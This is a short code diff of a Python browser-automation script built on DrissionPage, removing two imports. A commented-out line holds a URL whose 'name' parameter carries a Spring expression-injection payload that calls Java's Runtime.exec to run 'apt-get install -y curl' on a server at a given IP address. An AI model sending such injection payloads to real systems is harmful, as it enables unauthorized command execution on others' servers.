@@ -1,6 +1,5 @@
-import os
+
 from DrissionPage import ChromiumPage
-import requests
 page = ChromiumPage()
 
 # url="http://123.58.224.8:8020/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27apt-get%20install%20-y%20curl%27)"
